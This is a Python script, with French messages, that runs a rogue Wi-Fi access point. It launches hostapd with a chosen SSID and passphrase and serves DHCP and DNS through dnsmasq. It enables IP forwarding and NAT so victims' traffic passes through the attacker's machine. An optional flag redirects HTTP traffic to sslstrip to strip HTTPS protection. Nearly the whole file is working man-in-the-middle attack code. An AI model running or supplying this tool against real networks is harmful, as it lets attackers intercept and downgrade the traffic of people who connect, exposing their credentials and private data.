#!/usr/bin/env python
import argparse
import tempfile
import subprocess
import os
import sys
import time

def die(message):
    """Affiche un message d'erreur et termine le programme."""
    sys.stderr.write(f"{message}\n")
    sys.exit(1)

def check_command(command):
    """Vérifie si une commande est disponible sur le système."""
    try:
        return subprocess.run([command, "--help"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0
    except FileNotFoundError:
        return False

def poll_iface_exists(iface):
    """Vérifie si une interface réseau existe."""
    return subprocess.run(["ip", "link", "show", iface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL).returncode == 0

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("wlan_interface", help="Interface en mode monitor", type=str)
    parser.add_argument("inet_interface", help="Interface Internet", type=str)
    parser.add_argument("--ssid", help="SSID du réseau", type=str, required=True)
    parser.add_argument("--wpa", help="Phrase de passe WPA", type=str, required=True)
    parser.add_argument("--channel", help="Canal à utiliser", type=int, required=True)
    parser.add_argument("--sslstrip", help="Utiliser sslstrip", action="store_true")
    args = parser.parse_args()

    if os.geteuid() != 0:
        die("Vous devez être root")

    if not check_command("ip"):
        die("La commande 'ip' est absente ou cassée")

    if not check_command("tcpdump"):
        die("La commande 'tcpdump' est absente ou cassée")

    if not check_command("iptables"):
        die("La commande 'iptables' est absente ou cassée")

    if not check_command("dnsmasq"):
        die("La commande 'dnsmasq' est absente ou cassée")

    if not check_command("hostapd"):
        die("La commande 'hostapd' est absente ou cassée")

    if args.sslstrip and not check_command("sslstrip"):
        die("La commande 'sslstrip' est absente ou cassée")

    if not poll_iface_exists(args.wlan_interface):
        die(f"{args.wlan_interface} n'est pas une interface valide")

    if not poll_iface_exists(args.inet_interface):
        die(f"{args.inet_interface} n'est pas une interface valide")

    if not (8 <= len(args.wpa) <= 63):
        die("La phrase de passe WPA doit contenir entre 8 et 63 caractères")

    print("Démarrage du Rogue AP\n")
    print("En cours d'exécution")

    subprocess.run(["iw", "dev", args.wlan_interface, "set", "channel", str(args.channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    iface = args.wlan_interface

    with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
        ip_forward = f.read().strip()

    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

    subprocess.run(["iptables", "-I", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iptables", "-I", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iptables", "-t", "nat", "-I", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if args.sslstrip:
        subprocess.run(["iptables", "-t", "nat", "-I", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    with tempfile.NamedTemporaryFile(delete=False) as hostapd_file:
        hostapd_path = hostapd_file.name
        hostapd_file.write(f"""
        interface={iface}
        driver=nl80211
        ssid={args.ssid}
        channel={args.channel}
        wpa=3
        wpa_passphrase={args.wpa}
        """.encode())

    with tempfile.NamedTemporaryFile(delete=False) as dnsmasq_file:
        dnsmasq_path = dnsmasq_file.name
        dnsmasq_file.write(f"""
        interface={iface}
        dhcp-range=10.55.66.100,10.55.66.200,5m
        dhcp-option=3,10.55.66.1
        dhcp-option=6,10.55.66.1
        no-hosts
        addn-hosts=/dev/null
        """.encode())

    def nukeall(popen_list):
        for popen in popen_list:
            if popen.poll() is None:
                popen.kill()
        popen_list.clear()

    try:
        pids = []
        restart_count = -1
        while True:
            restart_count += 1
            print(f"********** INIT #{restart_count} *************")

            p = subprocess.Popen(["hostapd", hostapd_path])
            pids.append(p)

            print(f"Attente de l'apparition de l'interface '{iface}'")
            while not poll_iface_exists(iface):
                time.sleep(0.01)

            subprocess.run(["ifconfig", iface, "10.55.66.1", "netmask", "255.255.255.0", "up"])

            p = subprocess.Popen(["tcpdump", "-i", iface, "-w", "/dev/null"])
            pids.append(p)

            if args.sslstrip:
                p = subprocess.Popen(["sslstrip", "-a", "-f"], stderr=subprocess.DEVNULL)
                pids.append(p)

            p = subprocess.Popen(["dnsmasq", "-d", "-C", dnsmasq_path])
            pids.append(p)

            while True:
                if any(pid.poll() is not None for pid in pids):
                    break
                time.sleep(0.01)

            print("Un programme de la chaîne a échoué, redémarrage de la chaîne...\n")
            nukeall(pids)

    except KeyboardInterrupt:
        pass

    print("Arrêt du Rogue AP")
    nukeall(pids)

    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write(ip_forward)

    subprocess.run(["iptables", "-D", "FORWARD", "-i", iface, "-o", args.inet_interface, "-j", "ACCEPT"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iptables", "-D", "FORWARD", "-o", iface, "-i", args.inet_interface, "-j", "ACCEPT"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iptables", "-t", "nat", "-D", "POSTROUTING", "-o", args.inet_interface, "-j", "MASQUERADE"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    if args.sslstrip:
        subprocess.run(["iptables", "-t", "nat", "-D", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT", "--to-port", "10000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    subprocess.run(["ip", "addr", "flush", args.wlan_interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", args.wlan_interface, "down"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["iw", "dev", args.wlan_interface, "set", "type", "monitor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["ip", "link", "set", args.wlan_interface, "up"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    os.remove(dnsmasq_path)
    os.remove(hostapd_path)

if __name__ == "__main__":
    main()
